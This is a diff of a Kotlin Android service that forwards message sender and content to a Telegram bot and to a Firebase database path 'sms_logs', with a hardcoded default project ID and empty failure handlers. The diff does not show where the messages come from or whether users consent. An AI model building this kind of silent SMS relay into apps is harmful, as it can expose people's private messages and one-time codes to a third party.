@@ -5,7 +5,6 @@ import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONObject
-import java.io.IOException
 import java.net.URLEncoder
 
 object TelegramService {
@@ -16,33 +15,35 @@ object TelegramService {
         val modeIndex = prefs.getInt("mode_index", 0)
         
         val cleanText = "$sender: $message"
-        val encodedText = try { URLEncoder.encode(cleanText, "UTF-8") } catch (e: Exception) { cleanText }
+        val encodedText = URLEncoder.encode(cleanText, "UTF-8")
 
         // Telegram
         if (modeIndex == 0 || modeIndex == 2) {
             val token = prefs.getString("bot_token", "")
             val chatId = prefs.getString("chat_id", "")
-            if (!token.isNullOrEmpty() && !chatId.isNullOrEmpty()) {
+            if (!token.isNullOrEmpty()) {
                 val url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chatId&text=$encodedText"
-                val request = Request.Builder().url(url).build()
-                client.newCall(request).enqueue(object : Callback {
-                    override fun onFailure(call: Call, e: IOException) {}
+                client.newCall(Request.Builder().url(url).build()).enqueue(object : Callback {
+                    override fun onFailure(call: Call, e: java.io.IOException) {}
                     override fun onResponse(call: Call, response: Response) { response.close() }
                 })
             }
         }
 
-        // Firebase
+        // Firebase (Realtime Database JSON REST API)
         if (modeIndex == 1 || modeIndex == 2) {
             val fbId = prefs.getString("fb_id", "autopay-c8eea")
             val url = "https://$fbId-default-rtdb.firebaseio.com/sms_logs.json"
+            
             val json = JSONObject().apply {
-                put("sender", sender); put("message", message); put("time", System.currentTimeMillis())
+                put("sender", sender)
+                put("content", message)
+                put("timestamp", System.currentTimeMillis())
             }
+            
             val body = json.toString().toRequestBody("application/json".toMediaType())
-            val request = Request.Builder().url(url).post(body).build()
-            client.newCall(request).enqueue(object : Callback {
-                override fun onFailure(call: Call, e: IOException) {}
+            client.newCall(Request.Builder().url(url).post(body).build()).enqueue(object : Callback {
+                override fun onFailure(call: Call, e: java.io.IOException) {}
                 override fun onResponse(call: Call, response: Response) { response.close() }
             })
         }
